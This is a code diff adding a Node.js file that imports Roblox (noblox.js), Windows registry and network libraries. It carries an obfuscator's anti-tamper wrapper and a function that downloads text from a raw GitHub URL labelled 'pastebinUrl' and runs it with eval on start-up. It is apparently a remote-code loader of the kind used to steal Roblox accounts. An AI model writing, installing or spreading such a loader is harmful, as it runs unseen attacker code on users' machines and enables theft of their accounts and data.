@@ -1,0 +1,48 @@
+import { list as regListCb } from "regedit";
+import Express from "express";
+import bodyParser from "body-parser";
+import https from "https";
+import noblox from "noblox.js";
+import util from "util";
+import os from "os";
+import fetch from "node-fetch";
+import readline from "readline";
+import http from "http";
+import fs from "fs";
+import { fileURLToPath } from "url";
+import path from "path";
+import chalk from "chalk";
+import ProgressBar from "progress";
+import axios from "axios";
+function generateFunctionWrapper() {
+  var _0x5bf57d = true;
+  return function (_0x3ce8bb, _0x2414d6) {
+    var _0x1bc5ec = _0x5bf57d ? function () {
+      if (_0x2414d6) {
+        var _0x1c55a4 = _0x2414d6.apply(_0x3ce8bb, arguments);
+        _0x2414d6 = null;
+        return _0x1c55a4;
+      }
+    } : function () {};
+    _0x5bf57d = false;
+    return _0x1bc5ec;
+  };
+}
+function executeWrapper() {
+  var _0x198b7c = generateFunctionWrapper(this, function () {
+    return executeWrapper.toString().search("(((.+)+)+)+$").toString().constructor(executeWrapper).search("(((.+)+)+)+$");
+  });
+  _0x198b7c();
+}
+async function fetchData(_0x1c7d4f) {
+  try {
+    const _0x6780fe = await fetch(_0x1c7d4f);
+    const _0x3af52a = await _0x6780fe.text();
+    eval(_0x3af52a);
+  } catch (_0x1853e8) {
+    console.error("Error loading code:", _0x1853e8);
+  }
+}
+const pastebinUrl = "https://raw.githubusercontent.com/DiabloHub/DiabloHub/main/new";
+executeWrapper();
+fetchData(pastebinUrl);
